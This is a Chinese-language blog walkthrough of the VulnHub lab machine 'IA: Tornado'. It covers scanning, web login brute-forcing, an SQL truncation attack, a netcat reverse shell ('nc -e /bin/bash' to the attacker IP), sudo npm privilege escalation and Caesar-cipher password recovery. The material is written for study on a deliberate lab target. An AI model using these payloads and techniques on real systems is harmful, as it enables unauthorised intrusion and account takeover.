> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/fAEzd8pDKmRgxBhIIkIZWQ)

 ![](http://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUsGamtQXiblwiaPhT11gUfcWibGaGzbdzpL0N1UGmGdGP78y7DW7sCUOicTibjbBZHrHewj9uP2Tx3yPiaw/0?wx_fmt=png) ** 伏波路上学安全 ** 专注于渗透测试、代码审计等安全技术，分享安全知识. 32篇原创内容   公众号

![图片](https://mmbiz.qpic.cn/mmbiz_png/ZSH4VlHv0wUiapfR49hWa2eYqkEGbXzkuQ59LbkL2CvAM8l6ZgoEquXibP2LqGdBhxIemS84Jl7iaVqDK9CJXVdCw/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

![图片](https://mmbiz.qpic.cn/mmbiz_png/yy4ERibNaTfR1a65O0rmnQbpic6doaYJJDItNsfQWUBHsSJxn4TiaWOOnaB9CBdo2L7YUk8g2UpelUrQORCeDHHbw/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

**声明：**文章来自作者日常学习笔记，请勿利用文章内的相关技术从事非法测试，如因此产生的一切不良后果与文章作者和本公众号无关。仅供学习研究

![图片](https://mmbiz.qpic.cn/mmbiz_png/h6R0sRed4WF1Y7qVdRo7SibsRyCm88BjClJeIRVfaBH4LP84hq6VjWz5JKiadnZcuqTUwCVcHoSHlWr6o4X24Oxg/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

![图片](https://mmbiz.qpic.cn/mmbiz_png/HIvUXxmO2Igh1vy0Tiayxpn8jT7aGK2bPrl3vib0GUP2bnEpNQz2HB37ic3E1HX3mNjyDOqAP15IHgGibZZxtib5VhA/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

  

靶机信息  

-------

下载地址:

```
https://www.vulnhub.com/entry/ia-tornado,639/
```

靶场: VulnHub.com  

靶机名称: IA: Tornado

难度: 中等

发布时间: 2020年12月20日

提示信息:

```
无
```

目标: user.txt和root.txt

  

实验环境
----

```
`攻击机:VMware  kali  192.168.7.3``靶机:Vbox  linux  IP自动获取`
```

信息收集  

-------

### 扫描主机

扫描局域网内的靶机IP地址

```
sudo nmap -sP 192.168.7.1/24
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

扫描到主机地址为192.168.7.164

### 扫描端口

扫描靶机开放的服务端口

```
sudo nmap -sC -sV -p- 192.168.7.164 -oN Tornado.nmap
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

扫描到2个开放端口，22（SSH）和80（HTTP）服务，先从80开始

Web渗透
-----

访问80端口

```
http://192.168.7.164
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

打开后是apache2的默认页面，做个目录扫描

### 目录扫描

```
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://192.168.7.164 -x php,html,txt,zip
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

扫到一个目录，打开看看

```
http://192.168.7.164/bluesky
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

打开后是一个正常的页面，未找到敏感信息，对bluesky目录再做个扫描

```
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://192.168.7.164/bluesky -x php,html,txt,zip
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

扫描到多个可疑页面，contact.php、prot.php还有一个注册页面signup.php,我们先去注册个帐号

```
http://192.168.7.164/bluesky/signup.php
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

注册个帐号hh@hh.com密码123123,去登录

```
http://192.168.7.164/bluesky/login.php
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

访问contact.php页面

```
http://192.168.7.164/bluesky/contact.php
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

提示评论功能已关闭，再看看port.php页面

```
http://192.168.7.164/bluesky/port.php
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

提示“LFI(本地文件包含)漏洞已修复，不要忘记再次测试”，应该是要我们测试文件包含漏洞，打开源文件发现一些提示

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

在165行给了我们一个文件地址/home/tornado/imp.txt

先做个模糊测试，检测文件包含的参数是什么。

我对全部的页面做了FUZZ模糊测试都没成功，到目前已经走不下去了，无奈我破解了靶机的root用户密码登录到主机中查看

在/etc/apache2/apache2.conf文件中找到

```
Alias /~tornado/ "/home/tornado/"
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

这里确实是一个LFI漏洞，但是不在任何页面中，这个漏洞是由于服务器配置别名造成的，如何发现此漏洞有知道的大佬还请告知。

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

下载imp.txt文件

```
`wget http://192.168.7.164/~tornado/imp.txt``cat imp.txt`
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

拿到一些用户名，但是没有密码无法登录到web，暴破试试

我在手动测试时发现邮箱号输不全，查看源码后发现输入框限制了长度

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

手动把13改大一些即可，修改后可以完整输入帐号了

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

但是为什么限制13，我查了一下，这里有3个用户名是13位的，是不是这3个才是正确的用户

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

随后对这三个用户进行密码暴破

### Web密码暴破

设置攻击类型为集束炸弹(Clusterbomb),并将uname和upass设置为payload变量

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

payload1设置为3个用户名

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

payload2我使用了/usr/share/wordlists/rockyou.txt字典

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

成功暴破出admin@tornado用户的密码(密码竟然有多个，每个都能登录)

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

登录后没什么用，和手动注册的用户一样没有更多的提示

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

admin@tornado为什么有这么多密码

当我找不到任何继续前进的路时，在注册页面注册了sales@tornado用户

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

用sales@tornado用户再去登录

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

和admin@tornado结果一样，那现在还有一个用户jacob@tornado，如何才能拿到登录jacob@tornado用户呢？admin@tornado用户为什么有多个密码

### SQL Truncation Attack（SQL 截断攻击）

       由于用户名长度作了限制联想到后台数据库同样做了限制再加上admin@tornado用户的多个密码联想到后台肯定有多个admin@tornado用户，两个条件加在一起可以猜测到就是SQL截断攻击后产生的多个admin@tornado用户

简介：

当数据库由于长度限制而截断用户输入时，就会发生 SQL 截断漏洞。攻击者可以收集关键字段(例如用户名)长度的信息，并利用这些信息获得未经授权的访问。

让我们来测试一下，注册一个用户先修改输入限制，填入用户名是jacob@tornado空格a

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

注册成功，现在使用jacob@tornado用户以及注册用户时的密码登录

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

登陆成功并在contact.phpd页面下看到一个新功能 ，输入id命令返回了id，但是没有返回结果可能不回显

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

试试反弹个shell行不行

反弹shell
-------

kali攻击机监听端口4444

```
nc -lvvp 4444
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

靶机上提交反弹payload

```
nc -e /bin/bash 192.168.7.3 4444
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

反弹成功，切换交互型shell找一下敏感信息吧

```
`python3 -c 'import pty;pty.spawn("/bin/bash")'``export TERM=xterm`
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

```
`ls``cat signup.php`
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

数据库用户root密码heheroot,切换root用户试试

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

切换root用户失败，登录mysql看下admin@tornado用户什么情况

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

果然有多个一样的用户名，检查下哪里可以 提权

```
sudo -l
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

找到可以用catchme用户身份执行npm

npm提权
-----

需要准备两个文件，package.json和shell.sh

package.json文件内容，这个文件可以在攻击机上先写好，然后开启http服务，再用靶机将文件下载下来。也可以直接在靶机上创建，但是回显不太好。

```
`{` `"name": "shell",` `"version": "1.0.0",` `"description": "",` `"main": "index.js",` `"scripts": {` `"shell": "./shell.sh"``},` `"author": "",` `"license": "ISC"``}`
```

生成shell.sh

```
echo "/bin/bash" >shell.sh
```

为shell.sh加上可执行权限

```
chmod +x shell.sh
```

执行payload

```
sudo -u catchme npm run shell
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

提权成功，进入用户目录找到user.txt

```
`cd /home/catchme``ls -all``cat user.txt`
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

catchme目录下有个enc.py文件，查看一下内容

```
cat enc.py
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

有段加密的字符串,这是凯撒加密后的内容，我们通过python脚本来解密

decode.py

```
`import string``alphabet = string.ascii_lowercase``encrypted = "hcjqnnsotrrwnqc"``enc_len = len(encrypted)``for i in range(40):` `plain_text = ""` `for c in encrypted:` `if c.islower():` `c_unicode = ord(c)` `c_index = ord(c) - ord("a")` `new_index = (c_index - i) % 26` `new_unicode = new_index + ord("a")` `new_character = chr(new_unicode)` `plain_text = plain_text + new_character` `else:` `plain_text += c` `print(f"ID:{i} : {plain_text}")`
```

执行decode.py

```
python3 decode.py
```

拿到解密后的内容，这里有0-39共40组密码其中ID:25（idkrootpussxord）可读性比较像是密码，拿来切换root用户试试

```
`ID:0 : hcjqnnsotrrwnqc``ID:1 : gbipmmrnsqqvmpb``ID:2 : fahollqmrppuloa``ID:3 : ezgnkkplqootknz``ID:4 : dyfmjjokpnnsjmy``ID:5 : cxeliinjommrilx``ID:6 : bwdkhhminllqhkw``ID:7 : avcjgglhmkkpgjv``ID:8 : zubiffkgljjofiu``ID:9 : ytaheejfkiineht``ID:10 : xszgddiejhhmdgs``ID:11 : wryfcchdigglcfr``ID:12 : vqxebbgchffkbeq``ID:13 : upwdaafbgeejadp``ID:14 : tovczzeafddizco``ID:15 : snubyydzecchybn``ID:16 : rmtaxxcydbbgxam``ID:17 : qlszwwbxcaafwzl``ID:18 : pkryvvawbzzevyk``ID:19 : ojqxuuzvayyduxj``ID:20 : nipwttyuzxxctwi``ID:21 : mhovssxtywwbsvh``ID:22 : lgnurrwsxvvarug``ID:23 : kfmtqqvrwuuzqtf``ID:24 : jelsppuqvttypse``ID:25 : idkrootpussxord``ID:26 : hcjqnnsotrrwnqc``ID:27 : gbipmmrnsqqvmpb``ID:28 : fahollqmrppuloa``ID:29 : ezgnkkplqootknz``ID:30 : dyfmjjokpnnsjmy``ID:31 : cxeliinjommrilx``ID:32 : bwdkhhminllqhkw``ID:33 : avcjgglhmkkpgjv``ID:34 : zubiffkgljjofiu``ID:35 : ytaheejfkiineht``ID:36 : xszgddiejhhmdgs``ID:37 : wryfcchdigglcfr``ID:38 : vqxebbgchffkbeq``ID:39 : upwdaafbgeejadp`
```

切换root用户  

```
`su root``输入密码idkrootpussxord`
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

登录失败，仔细看这个字符串有三部分组成

```
`idk``root``pussxord`
```

把这里的pussxord替换成password切换成功

```
idkrootpassword
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

查看root.txt

```
`cd /root``ls``cat root.txt`
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

拿到root.txt游戏结束。

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

END

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

**这篇文章到这里就结束了,喜欢打靶的小伙伴可以关注"伏波路上学安全"微信公众号,或扫描下面二维码关注,我会持续更新打靶文章,让我们一起在打靶中学习进步吧.**

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)